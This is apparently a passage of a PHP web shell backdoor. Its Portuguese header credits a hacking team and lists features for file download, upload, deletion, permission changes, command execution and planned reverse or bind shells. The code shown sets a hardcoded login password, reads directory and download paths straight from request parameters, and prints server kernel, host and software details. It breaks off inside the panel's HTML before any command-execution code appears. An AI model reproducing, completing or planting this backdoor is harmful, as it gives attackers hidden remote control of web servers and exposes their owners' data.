<?php

	/*
		Versão: 1.0
		Software: Web Shell Backdoor
		Linguagem: PHP
		Ano: 2016
		Programado por: @OffsetCode & @GhostDork
		Team: The Cybers
		Chat: https://telegram.me/TheCybersTeam
		Canal: https://telegram.me/TheCyberChannel
		Youtube: https://www.youtube.com/channel/UCKFMv1cifW55lKKps2thhbw
		Pagina: hhttps://www.facebook.com/TheCybersTeam
		Grupo: https://www.facebook.com/groups/TheCybersTeam

	Menu:
		Arquivos:
			- baixar [ok]
			- renomear [ok]
			- deletar [ok]
			- selecionar todos [no]
			- deletar selecionados [no]
			- upload [ok]
			- permissão [ok]
			- tamanho [ok]
		
		Comandos:
			- executar [ok]

		Conexão:
			- backconnect [no]
			- bind connect [no]

		Lookup:
			- Ip lookup domain [ok]
		
		Info
			- [no]
	*/

	// Inicia a sessão para validar o login
	session_start();

	// Senha para fazer login
	$senha = "123";

	// Caso algum diretorio não seja especificado via get irá pegar o diretorio atual
	if(!$diretorio = $_GET['ls']){
		$diretorio = getcwd();
	}

	// Se a senha fornecida estiver correta loga o usuario.
	if($_POST['senha'] == $senha){
		$_SESSION['login'] = 1;
	}

	// Desconecta o usuario
	if($_GET['logout']){
		$_SESSION['login'] = 0;
	}

	// Chama função para baixar o arquivo
	if($arquivo = $_GET['download']){
		download($arquivo);
	}
?>

<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>The Cybers Shell [v1.0]</title>
	<meta charset="utf-8">
<style>
*{box-sizing: border-box;}
.row::after {content: "";clear: both;display: block;}
[class*="col-"] {float: left;padding: 15px;}
.col-1 {width: 8.33%;}
.col-2 {width: 16.66%;}
.col-3 {width: 25%;}
.col-4 {width: 33.33%;}
.col-5 {width: 41.66%;}
.col-6 {width: 50%;}
.col-7 {width: 58.33%;}
.col-8 {width: 66.66%;}
.col-9 {width: 75%;}
.col-10 {width: 83.33%;}
.col-11 {width: 91.66%;}
.col-12 {width: 100%;}
html {font-family: "Lucida Sans", sans-serif;}
body{background-color: #090909; margin:0; padding:0; color:#eee;}
a{text-decoration: none;}
a:hover{color:white;}
<?php

// Se o usuario não estiver logado adiciona o css inline da pagina de login
if(!$_SESSION['login']){
	echo"
	#login img{width:150px;margin-left:50px;}
	#login form{margin:0 auto;width:250px;}
	#login h2{text-align: center;}
	#login input{padding:5px;border: solid 1px #111;background-color:#111;margin:2px 0 2px 0;}
	#login input:focus{border: solid 1px red;}
	#login #senha{width:238px;}
	#login #entrar{width:100%;}
	#login #entrar:hover{width:100%;cursor:pointer;background-color:#222;color:white;}
	";
}
// se o usuario estiver logado adiciona o css inline do painel interno
else{
	echo "
	h2 a{text-decoration: none;}
	#rodape{color:#aaa;text-decoration: none;}
	#rodape:hover{color: white;}
	#upar{padding: 8px;}
	input{padding:5px;border: solid 1px #111;background-color:#111;}
	input:hover{cursor:pointer;background-color:#222;color:white;}
	.container{width:98%;margin:0 auto;}
	tr:hover{background-color:#333;}
	li{display: inline-block;width:100px;}
	li a{color:white;}
	li a:hover{color:red;}
	li:hover{color:red;cursor:pointer;}
	table{width:100%;background-color:#141414;border-radius: 5px;border: 1px solid #222;border-spacing: 0px;}
	body, h1 a{text-decoration: none;}
	th,td{text-align: left;width:200px;}
	form{padding:5px;margin-top:10px;margin-bottom:10px;border-radius: 5px;}
	a{color:red;}
	.check{width:30px;}
	.linha::after{content: '';clear: both;display: block;background-color:#aaa;}
	#info{width:100%;padding:10px;float:left;border: solid 1px #222;background-color:#111;margin-top:10px;}
	#logo{float:left;text-align: center;}
	#menu{text-align: center;padding:0px;}
	#logo h2{height:1px;}
	#shell{float: left;width: 100%;}
	section{background-color: #141414;border-radius: 5px;border: 1px solid #222;width:100%;}
	section header{padding:10px;background-color: #222;}
	section article{padding:10px;}
	";
}
?>
</style>
</head>
<body>
<div class="container">
<?php
// Caso não estiver logado mostra a pagina de login
if(!$_SESSION['login']){
	login();
}
// Se estiver logado mostra o painel interno
else{
	painel($diretorio);
}

// Funções =======================================================

// Monta todos itens internos do painel
function painel($diretorio){

	// Logo em base64 ===================================================================
	$logo = "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
	h4PczL8NAHmor5EwvxbfAAAAAElFTkSuQmCC";
	// Fim da logo =============================================================

	echo "
	<div class='row'>
		<div class='col-4'>
			<div id='info'>
				<small>
				Kernel: ".php_uname('r')."<br />
				Machine: ".php_uname('m')."<br />
				Os: ".php_uname('n')."<br />
				Ip: ";echo $_SERVER[REMOTE_ADDR];echo"<br />
				Host: ";echo $_SERVER[HTTP_HOST];echo "<br />
				Data: ".date(d)."/".date(m)."/".date(Y)."<br />
				Hora: ".date(H).":".date(i).":".date(s)."<br />
				Software: "; echo $_SERVER[SERVER_SOFTWARE];echo"<br />
				</small>
			</div>
		</div>

		<div class='col-4' id='logo'>
			<a href='shell.php' title='Home'>
				<img style='width:100px' src='data:image/png;base64,$logo'>
				<h2>The Cybers Shell</h2>
			</a>
		</div>

		<div class='col-4'>
			<div id='info'>
				<small>
				Kernel: ".php_uname('r')."<br />
				Machine: ".php_uname('m')."<br />
				Os: ".php_uname('n')."<br />
				Ip: ";echo $_SERVER[REMOTE_ADDR];echo"<br />
				Host: ";echo $_SERVER[HTTP_HOST];echo "<br />
				Data: ".date(d)."/".date(m)."/".date(Y)."<br />
				Hora: ".date(H).":".date(i).":".date(s)."<br />
